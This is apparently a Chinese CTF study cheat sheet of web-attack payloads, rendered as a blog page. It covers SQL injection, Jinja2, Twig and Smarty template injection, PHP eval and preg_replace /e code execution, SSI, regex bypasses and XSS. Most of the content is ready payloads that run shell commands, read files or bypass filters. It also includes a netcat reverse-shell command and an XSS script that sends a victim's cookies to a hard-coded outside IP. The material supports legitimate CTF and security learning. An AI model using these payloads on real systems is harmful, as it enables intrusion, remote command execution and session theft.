+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">echo</span> <span class="keyword">new</span> <span class="variable">$_POST</span>[<span class="string">&#x27;X&#x27;</span>](<span class="variable">$_POST</span>[<span class="string">&#x27;Y&#x27;</span>]);</span><br></pre></td></tr></table></figure>
+
+<p>可以输入：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">X=SplFileObject&amp;Y=php://filter/read=convert.base64-encode/resource=flag.php</span><br></pre></td></tr></table></figure>
+
+<p>即搭配上伪协议进行读取文件。</p>
+<h3 id="Phar反序列化"><a href="#Phar反序列化" class="headerlink" title="Phar反序列化"></a>Phar反序列化</h3><p><strong>漏洞原理</strong></p>
+<p>Phar文件中<u>manifest</u>部分以序列化存储着压缩文件的属性等信息，当用phar伪协议对其进行读取的时候，会自动将文件内manifest部分进行反序列化，配合一些魔术方法则可以触发漏洞。</p>
+<h2 id="SQL注入"><a href="#SQL注入" class="headerlink" title="SQL注入"></a>SQL注入</h2><h3 id="重要的SQL函数"><a href="#重要的SQL函数" class="headerlink" title="重要的SQL函数"></a>重要的SQL函数</h3><p><strong>if(xxx,1,0)</strong></p>
+<p>如果xxx条件成立，返回1，否则返回0</p>
+<p><strong>mid(str,5,10)</strong></p>
+<p>从str字符串中第五个字符开始提取后面10个字符</p>
+<h3 id="SQL盲注"><a href="#SQL盲注" class="headerlink" title="SQL盲注"></a>SQL盲注</h3><p>if语句用法：if(条件,1,0) ，如果条件判断成立返回1，不成立返回0</p>
+<h3 id="堆叠注入"><a href="#堆叠注入" class="headerlink" title="堆叠注入"></a>堆叠注入</h3><p>常用payload：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">show databases;   获取数据库名</span><br><span class="line">show tables;  获取表名</span><br><span class="line">show columns from `table_name`; 获取列名</span><br></pre></td></tr></table></figure>
+
+<p>当select等被禁用时，可以使用HANDLER方法，具体payload如下：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27;;handler 表名 open;handler 表名 read first;handler 表名 close;#</span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h3><p>payload：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27; or extractvalue(0,concat(0x7e,database()))%23</span><br></pre></td></tr></table></figure>
+
+<p>当or被过滤时，可以使用<code>||</code>来代替。</p>
+<p>特性：</p>
+<p>当database被ban而无法得知数据库名字时，可以构造如下payload：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27; or extractvalue(0,concat(0x7e,(select * from aa)))%23</span><br></pre></td></tr></table></figure>
+
+<p>因为aa表不存在，所以它会报错，但是这个报错会把数据库一起带进来：</p>
+<p><code>sqlsql.aa</code></p>
+<h3 id="无列名注入"><a href="#无列名注入" class="headerlink" title="无列名注入"></a>无列名注入</h3><p><strong>基于union：</strong></p>
+<p>假设表：</p>
+<table>
+<thead>
+<tr>
+<th>id</th>
+<th>username</th>
+<th>password</th>
+<th>question</th>
+<th>token</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>1</td>
+<td>1a</td>
+<td>1b</td>
+<td>1c</td>
+<td>1d</td>
+</tr>
+<tr>
+<td>2</td>
+<td>2a</td>
+<td>2b</td>
+<td>2c</td>
+<td>2d</td>
+</tr>
+<tr>
+<td>3</td>
+<td>3a</td>
+<td>3b</td>
+<td>3c</td>
+<td>3d</td>
+</tr>
+</tbody></table>
+<p>当题目中用<code>limit 0,1</code>这样的语句限制了只能查询第一行时，可以采取无列名注入方法：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select group_concat(`2`) from (select 1,2,3,4,5 union select * from table)a;</span><br></pre></td></tr></table></figure>
+
+<p>即：返回第二行的内容</p>
+<p>当反引号被过滤的时候，可以采用如下的payload：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select c from (select 1,2 as b,3,4 as c,5 as d union select * from table)a;</span><br></pre></td></tr></table></figure>
+
+
+
+<p><strong>基于join：</strong></p>
+<p>原理：</p>
+<p>join是把两张表的列名相加，就导致有可能会产生相同的表名，但是join不允许合并的两个表中有相同的列名，因此通过报错得到列名</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select * from tp_one;</span><br><span class="line">+----------+----------+</span><br><span class="line">| username | password |</span><br><span class="line">+----------+----------+</span><br><span class="line">| Tom      | 123      |</span><br><span class="line">+----------+----------+</span><br><span class="line"> </span><br><span class="line">mysql&gt; select * from tp_one union select * from (select * from tp_one as a join tp_one as b) as c;</span><br><span class="line">ERROR 1060 (42S21): Duplicate column name &#x27;username&#x27;</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">mysql&gt; select * from tp_one union select * from (select * from tp_one as a join tp_one as b using(username)) as c;   //获取第二个列名</span><br><span class="line">ERROR 1060 (42S21): Duplicate column name &#x27;password&#x27;</span><br></pre></td></tr></table></figure>
+
+
+
+
+
+<h3 id="Quine注入"><a href="#Quine注入" class="headerlink" title="Quine注入"></a>Quine注入</h3><p>一种特殊的SQL注入方法，使得输入的SQL语句能与输出的SQL语句一致。</p>
+<p>payload：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27;/**/union/**/select/**/replace(replace(&#x27;1&quot;/**/union/**/select/**/replace(replace(&quot;.&quot;,char(34),char(39)),char(46),&quot;.&quot;)#&#x27;,char(34),char(39)),char(46),&#x27;1&quot;/**/union/**/select/**/replace(replace(&quot;.&quot;,char(34),char(39)),char(46),&quot;.&quot;)#&#x27;)#</span><br></pre></td></tr></table></figure>
+
+
+
+
+
+<h2 id="RCE"><a href="#RCE" class="headerlink" title="RCE"></a>RCE</h2><h3 id="嵌套函数RCE"><a href="#嵌套函数RCE" class="headerlink" title="嵌套函数RCE"></a>嵌套函数RCE</h3><p>直接用php函数进行目录下的文件浏览与文件读取。</p>
+<p><code>current(localeconv());</code>组合可以创造一个’.’</p>
+<p>结合scandir函数可以进行目录浏览：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">var_dump(scandir(current(localeconv())));</span><br></pre></td></tr></table></figure>
+
+
+
+<p>chr函数用于将ascii值转换成对应的字符，所以可以构造payload：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">var_dump(scandir(chr(47)));</span><br></pre></td></tr></table></figure>
+
+<p>用于浏览根目录下的所有文件</p>
+<h3 id="eval绕过长度限制的构造思路"><a href="#eval绕过长度限制的构造思路" class="headerlink" title="eval绕过长度限制的构造思路"></a>eval绕过长度限制的构造思路</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$param</span> = <span class="variable">$_REQUEST</span>[<span class="string">&#x27;param&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">strlen</span>(<span class="variable">$param</span>)&lt;<span class="number">17</span> &amp;&amp; <span class="title function_ invoke__">stripos</span>(<span class="variable">$param</span>,<span class="string">&#x27;eval&#x27;</span>) === <span class="literal">false</span> &amp;&amp; <span class="title function_ invoke__">stripos</span>(<span class="variable">$param</span>,<span class="string">&#x27;assert&#x27;</span>) === <span class="literal">false</span>) &#123;</span><br><span class="line">  <span class="keyword">eval</span>(<span class="variable">$param</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>构造：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">param=`$_GET[1]`;&amp;1=bash</span><br></pre></td></tr></table></figure>
+
+<p>或是：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">param=exec($_GET[1]);</span><br></pre></td></tr></table></figure>
+
+
+
+
+
+
+
+<h3 id="反弹Shell"><a href="#反弹Shell" class="headerlink" title="反弹Shell"></a>反弹Shell</h3><p>netcat反弹</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc ip port -e sh</span><br></pre></td></tr></table></figure>
+
+
+
+<h4 id="Tips"><a href="#Tips" class="headerlink" title="Tips"></a>Tips</h4><p>有时候根目录和当前目录都没有flag，可以通过system函数执行指令：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find / -name flag*</span><br></pre></td></tr></table></figure>
+
+<p>它可以搜索各目录下的flag</p>
+<h2 id="CSRF"><a href="#CSRF" class="headerlink" title="CSRF"></a>CSRF</h2><h2 id="SSTI"><a href="#SSTI" class="headerlink" title="SSTI"></a>SSTI</h2><h3 id="Smarty"><a href="#Smarty" class="headerlink" title="Smarty"></a>Smarty</h3><p>利用{if}标签执行php函数。</p>
+<p>Smarty的{if}条件判断和PHP的if 非常相似，只是增加了一些特性。每个{if}必须有一个配对的{&#x2F;if}. 也可以使用{else} 和 {elseif}. 全部的PHP条件表达式和函数都可以在if内使用，如*||*, or, &amp;&amp;, and, is_array(), 等等</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;if phpinfo()&#125;&#123;/if&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="Twig"><a href="#Twig" class="headerlink" title="Twig"></a>Twig</h3><p>常用payload：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;_self.env.registerUndefinedFilterCallback(&quot;exec&quot;)&#125;&#125;&#123;&#123;_self.env.getFilter(&quot;cat /flag&quot;)&#125;&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="Jinja2"><a href="#Jinja2" class="headerlink" title="Jinja2"></a>Jinja2</h3><h4 id="含有eval函数的可用类："><a href="#含有eval函数的可用类：" class="headerlink" title="含有eval函数的可用类："></a>含有eval函数的可用类：</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">warnings.catch_warnings</span><br><span class="line">WarningMessage</span><br><span class="line">codecs.IncrementalEncoder</span><br><span class="line">codecs.IncrementalDecoder</span><br><span class="line">codecs.StreamReaderWriter</span><br><span class="line">os._wrap_close</span><br><span class="line">reprlib.Repr</span><br><span class="line">weakref.finalize</span><br><span class="line">site._Printer</span><br></pre></td></tr></table></figure>
+
+
+
+<h4 id="以上类的基本payload："><a href="#以上类的基本payload：" class="headerlink" title="以上类的基本payload："></a>以上类的基本payload：</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;&#x27;&#x27;.__class__.__bases__[0].__subclasses__()[166].__init__.__globals__[&#x27;__builtins__&#x27;][&#x27;eval&#x27;](&#x27;__import__(&quot;os&quot;).popen(&quot;ls /&quot;).read()&#x27;)&#125;&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+<h4 id="利用url-for"><a href="#利用url-for" class="headerlink" title="利用url_for"></a>利用url_for</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;url_for.__init__[&#x27;__global&#x27;+&#x27;s__&#x27;].os.popen(&quot;whoami&quot;).read()&#125;&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+<h4 id="利用config"><a href="#利用config" class="headerlink" title="利用config"></a>利用config</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;config.__init__[&#x27;__global&#x27;+&#x27;s__&#x27;].os.popen(&quot;whoami&quot;).read()&#125;&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+<h4 id="含有os模块的类："><a href="#含有os模块的类：" class="headerlink" title="含有os模块的类："></a>含有os模块的类：</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;&#x27;&#x27;.__class__.__bases__[0].__subclasses__()[79].__init__.__globals__[&#x27;os&#x27;].popen(&#x27;ls /&#x27;).read()&#125;&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+<h4 id="利用subprocess-Popen类："><a href="#利用subprocess-Popen类：" class="headerlink" title="利用subprocess.Popen类："></a>利用subprocess.Popen类：</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;&#x27;&#x27;.__class__.__mro__[2].__subclasses__()[258](&#x27;ls&#x27;,shell=True,stdout=-1).communicate()[0].strip()&#125;&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+<h4 id="读取app-py源码："><a href="#读取app-py源码：" class="headerlink" title="读取app.py源码："></a>读取app.py源码：</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;&#123;% if c.__name__==&#x27;catch_warnings&#x27; %&#125;&#123;&#123; c.__init__.__globals__[&#x27;__builtins__&#x27;].open(&#x27;app.py&#x27;,&#x27;r&#x27;).read()&#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+<h4 id="搭配上for循环找根目录文件：-省去找可用类的步骤"><a href="#搭配上for循环找根目录文件：-省去找可用类的步骤" class="headerlink" title="搭配上for循环找根目录文件：(省去找可用类的步骤)"></a>搭配上for循环找根目录文件：(省去找可用类的步骤)</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;&#123;% if c.__name__==&#x27;catch_warnings&#x27; %&#125;&#123;&#123; c.__init__.__globals__[&#x27;__builtins__&#x27;].eval(&quot;__import__(&#x27;os&#x27;).popen(&#x27;ls /&#x27;).read()&quot;)&#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;&#123;% if c.__name__==&#x27;catch_warnings&#x27; %&#125;&#123;&#123; c.__init__.__globals__[&#x27;__builtins__&#x27;][&#x27;__imp&#x27;+&#x27;ort__&#x27;](&#x27;o&#x27;+&#x27;s&#x27;).listdir(&#x27;/&#x27;)&#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+<h4 id="读取文件："><a href="#读取文件：" class="headerlink" title="读取文件："></a>读取文件：</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;&#123;% if c.__name__==&#x27;catch_warnings&#x27; %&#125;&#123;&#123; c.__init__.__globals__[&#x27;__builtins__&#x27;].open(&#x27;/this_is_the_fl&#x27;+&#x27;ag.txt&#x27;,&#x27;r&#x27;).read()&#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+<h4 id="绕过中括号过滤"><a href="#绕过中括号过滤" class="headerlink" title="绕过中括号过滤"></a>绕过中括号过滤</h4><p>原payload：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;&#x27;&#x27;.__class__.__bases__[0].__subclasses__()[166].__init__.__globals__[&#x27;__builtins__&#x27;][&#x27;eval&#x27;](&#x27;__import__(&quot;os&quot;).popen(&quot;ls /&quot;).read()&#x27;)&#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<p>使用<code>__getitem__()</code>函数进行绕过:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;().__class__.__bases__.__getitem__(0).__subclasses__().__getitem__(166).__init__.__globals__.__getitem__(&#x27;__builtins__&#x27;).__getitem__(&#x27;eval&#x27;)(&#x27;__import__(&quot;os&quot;).popen(&quot;ls /&quot;).read()&#x27;)&#125;&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+<h4 id="利用request对象绕过引号"><a href="#利用request对象绕过引号" class="headerlink" title="利用request对象绕过引号"></a>利用request对象绕过引号</h4><p>原payload：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;().__class__.__base__.__subclasses__()[77].__init__.__globals__[&#x27;os&#x27;].popen(&#x27;ls /&#x27;).read()&#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<p>绕过：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;().__class__.__base__.__subclasses__()[77].__init__.__globals__[request.args.os].popen(request.args.cmd).read()&#125;&#125;&amp;os=os&amp;cmd=ls /</span><br></pre></td></tr></table></figure>
+
+
+
+<h4 id="利用-attr-语句绕过点号"><a href="#利用-attr-语句绕过点号" class="headerlink" title="利用|attr()语句绕过点号"></a>利用|attr()语句绕过点号</h4><p>原payload：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;().__class__.__base__.__subclasses__()[77].__init__.__globals__[&#x27;os&#x27;].popen(&#x27;ls&#x27;).read()&#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<p>绕过过滤<code>.</code>：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;()|attr(&quot;__class__&quot;)|attr(&quot;__base__&quot;)|attr(&quot;__subclasses__&quot;)()|attr(&quot;__getitem__&quot;)(77)|attr(&quot;__init__&quot;)|attr(&quot;__globals__&quot;)|attr(&quot;__getitem__&quot;)(&quot;os&quot;)|attr(&quot;popen&quot;)(&quot;ls&quot;)|attr(&quot;read&quot;)()&#125;&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+<h4 id="利用字符串拼接绕过关键字匹配"><a href="#利用字符串拼接绕过关键字匹配" class="headerlink" title="利用字符串拼接绕过关键字匹配"></a>利用字符串拼接绕过关键字匹配</h4><p>原payload：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;&#123;% if c.__name__==&#x27;catch_warnings&#x27; %&#125;&#123;&#123; c.__init__.__globals__[&#x27;__builtins__&#x27;][&#x27;__import__&#x27;](&#x27;os&#x27;).listdir(&#x27;/&#x27;)&#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;</span><br></pre></td></tr></table></figure>
+
+<p>拼接后：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;&#123;% if c.__name__==&#x27;catch_warnings&#x27; %&#125;&#123;&#123; c.__init__.__globals__[&#x27;__builtins__&#x27;][&#x27;__imp&#x27;+&#x27;ort__&#x27;](&#x27;o&#x27;+&#x27;s&#x27;).listdir(&#x27;/&#x27;)&#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;</span><br></pre></td></tr></table></figure>
+
+<p><strong>注意！</strong></p>
+<p>只有语句中被引号包围的字段才可以使用这个方法绕过。</p>
+<p><strong>特殊地</strong>：</p>
+<p>当global被过滤时，假设原payload：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;[].__class__.__base__.__subclasses__()[132].__init__.__globals__&#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<p>这个可以等价成： (注意init后面的<code>.</code>没了)</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;[].__class__.__base__.__subclasses__()[132].__init__[&quot;__globals__&quot;]&#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<p>这种情况下global被引号包围了，就可以使用字符串拼接的方法进行绕过。</p>
+<h2 id="XSS"><a href="#XSS" class="headerlink" title="XSS"></a>XSS</h2><p>原理：把javascript代码插入到前端代码中执行</p>
+<p><strong>反射性XSS</strong>：在url中构造好payload，发送给受害者，受害者点击从而执行</p>
+<p><strong>存储型XSS</strong>：传入到服务端中，受害者点击看似正常的链接也能触发</p>
+<p>CTF中针对无过滤的基本payload：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;window.location.href=&#x27;http://8.137.78.89/cookie.php?a=&#x27;+document.cookie&lt;/script&gt;</span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="过滤script"><a href="#过滤script" class="headerlink" title="过滤script"></a>过滤script</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;IMG SRC=&quot;&quot; onerror=&quot;alert(&#x27;XSS&#x27;)&quot;&gt;</span><br></pre></td></tr></table></figure>
+
+<p>图片没有指定，即是出错，触发Onerror事件。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;BODY onload=&quot;alert(&#x27;XSS&#x27;)&quot;&gt;</span><br></pre></td></tr></table></figure>
+
+
+
+
+
+<h2 id="SSI"><a href="#SSI" class="headerlink" title="SSI"></a>SSI</h2><p>如果网站目录中发现了形如<code>.stm；.shtm；.shtml</code>这样的文件，可以使用如下的payload进行命令执行：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!--#exec cmd=&quot;ls&quot;--&gt;</span><br></pre></td></tr></table></figure>
+
+
+
+
+
+
+
+<h2 id="正则表达式"><a href="#正则表达式" class="headerlink" title="正则表达式"></a>正则表达式</h2><h3 id=""><a href="#" class="headerlink" title="^"></a>^</h3><p><code>^</code>号紧贴着开头的<code>/</code>号的后面，表示匹配字符串的开始位置。</p>
+<p>例如：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/^abc/</span><br></pre></td></tr></table></figure>
+
+<p>字符串<code>abc</code>会被匹配，而<code>66abc</code>不会被匹配，因为abc没有处于开头的位置。</p>
+<h3 id="-1"><a href="#-1" class="headerlink" title="$"></a>$</h3><p><code>$</code>号紧贴着最后一个<code>/</code>号的前面，表示匹配字符串的结束位置。</p>
+<p>例如：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/abc$/</span><br></pre></td></tr></table></figure>
+
+<p>字符串<code>abc</code>会被匹配，而<code>abc66</code>不会被匹配，因为abc没有处于结尾的位置。</p>
+<p>在非多行模式中，其会忽略句尾的<code>%0a</code>，即不比较多行，例如：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/^flag$/&#x27;</span>, <span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>]) &amp;&amp; <span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>] !== <span class="string">&#x27;flag&#x27;</span>) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?a=flag%0a</span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="-2"><a href="#-2" class="headerlink" title="."></a>.</h3><p>表示出了“新行”之外的所有字符，可以使用<code>\n</code>换行进行绕过。例如：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/^.*(flag).*$/&#x27;</span>, <span class="variable">$json</span>)) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;Hacking attempt detected&lt;br/&gt;&lt;br/&gt;&#x27;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>绕过：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$json=&quot;\nflag&quot;</span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="i"><a href="#i" class="headerlink" title="&#x2F;i"></a>&#x2F;i</h3><p>表达式若出现&#x2F;i代表匹配时不区分大小写，若遇到正则没开启&#x2F;i时可以尝试大小写绕过。</p>
+<h3 id="m"><a href="#m" class="headerlink" title="&#x2F;m"></a>&#x2F;m</h3><p>表达式若出现&#x2F;m代表匹配时开启多行匹配，但遇到换行符**%0a**时，会被当做两行处理，而此时只可以匹配第 1 行，后面的行就会被忽略。</p>
+<h3 id="e"><a href="#e" class="headerlink" title="&#x2F;e"></a>&#x2F;e</h3><p>可能引起RCE漏洞，payload：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">preg_replace(&#x27;.*&#x27;)/ei&#x27;,&#x27;strtolower(&quot;\\1&quot;)&#x27;, &#123;$&#123;此处填函数名&#125;&#125;);</span><br></pre></td></tr></table></figure>
+
+<p>.*可以替换成<code>\S*</code></p>
+<p>遇到如下的无限制传参：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">preg_replace</span>(<span class="variable">$_GET</span>[<span class="string">&quot;pattern&quot;</span>], <span class="variable">$_GET</span>[<span class="string">&quot;new&quot;</span>], <span class="variable">$_GET</span>[<span class="string">&quot;base&quot;</span>]);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>可以传入<code>/e</code>修饰符，使中间的”new”代码被执行。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?pattern=/233/e&amp;new=phpinfo()&amp;base=233</span><br></pre></td></tr></table></figure>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<h2 id="Docker"><a href="#Docker" class="headerlink" title="Docker"></a>Docker</h2><p>常用命令：</p>
+<p>停用所有容器：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker stop $(docker ps -a -q)</span><br></pre></td></tr></table></figure>
+
+<p>删除所有容器：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker rm $(docker ps -a -q)</span><br></pre></td></tr></table></figure>
+
+
+
+
+
+<h2 id="Linux命令"><a href="#Linux命令" class="headerlink" title="Linux命令"></a>Linux命令</h2><h2 id="makefile读s取文件内容"><a href="#makefile读s取文件内容" class="headerlink" title="makefile读s取文件内容"></a>makefile读s取文件内容</h2><p>命令：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">content := $(shell cat flag)</span><br></pre></td></tr></table></figure>
+
+
+
+
+
